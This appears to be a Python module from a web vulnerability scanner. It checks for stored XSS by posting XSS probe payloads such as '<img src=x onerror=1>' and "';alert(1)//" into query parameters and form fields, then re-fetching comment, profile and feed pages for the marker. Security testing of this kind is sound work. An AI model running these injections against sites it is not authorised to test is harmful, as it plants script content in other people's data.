"""Second-order / stored XSS: inject multi-payload then re-fetch sinks."""
from __future__ import annotations

import hashlib
from typing import Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from utils.logger import get_logger

logger = get_logger(__name__)


class StoredXSSTester:
    def __init__(self, http_client, config: Dict):
        self.http_client = http_client
        self.config = config
        self.cfg = config.get("stored_xss") or {}
        self.marker = self.cfg.get("marker", "deepeye_sxss_")

    def scan(self, url: str, context: Optional[Dict] = None) -> List[Dict]:
        vulns: List[Dict] = []
        token = self.marker + hashlib.md5(url.encode()).hexdigest()[:8]
        payloads = [
            f'<img src=x id="{token}" onerror=1>',
            f'"><svg/onload=1 id="{token}">',
            f"';alert(1)//{token}",
            f"<details open ontoggle=1 id={token}>",
        ]
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        form_fields = ["comment", "message", "q", "search", "name", "content", "body", "title", "bio"]
        if context and context.get("forms"):
            for form in context["forms"]:
                if not isinstance(form, dict):
                    continue
                for inp in form.get("inputs") or []:
                    if isinstance(inp, dict) and inp.get("name"):
                        form_fields.append(str(inp["name"]))
        form_fields = list(dict.fromkeys(form_fields))

        for payload in payloads[:3]:
            if qs:
                for key in list(qs.keys())[:3]:
                    qs2 = {k: list(v) for k, v in qs.items()}
                    qs2[key] = [payload]
                    inj = urlunparse(parsed._replace(query=urlencode(qs2, doseq=True)))
                    try:
                        self.http_client.get(inj)
                    except Exception as e:
                        logger.debug(f"stored xss inject: {e}")
            for field in form_fields[:6]:
                try:
                    self.http_client.post(url, data={field: payload})
                except Exception:
                    pass
                try:
                    self.http_client.post(url, json={field: payload})
                except Exception:
                    pass

        sinks = [url]
        if context and context.get("url"):
            sinks.append(context["url"])
        for s in (self.cfg.get("sink_urls") or [])[:5]:
            if isinstance(s, str) and s:
                sinks.append(s)
        # common list endpoints relative to origin
        base = f"{parsed.scheme}://{parsed.netloc}"
        for path in ("/comments", "/posts", "/feed", "/profile", "/search", "/messages"):
            sinks.append(base + path)

        for sink in list(dict.fromkeys(sinks))[:8]:
            try:
                resp = self.http_client.get(sink)
                body = getattr(resp, "text", "") or ""
                if token in body:
                    vulns.append({
                        "type": "Stored XSS (second-order)",
                        "severity": "high",
                        "url": sink,
                        "parameter": "",
                        "payload": token,
                        "evidence": f"Marker {token} reflected in stored content at {sink}",
                        "description": "Injected payload persisted and rendered",
                        "remediation": "Encode output contextually; sanitize stored HTML",
                    })
                    break
            except Exception as e:
                logger.debug(f"stored xss sink: {e}")
        return vulns
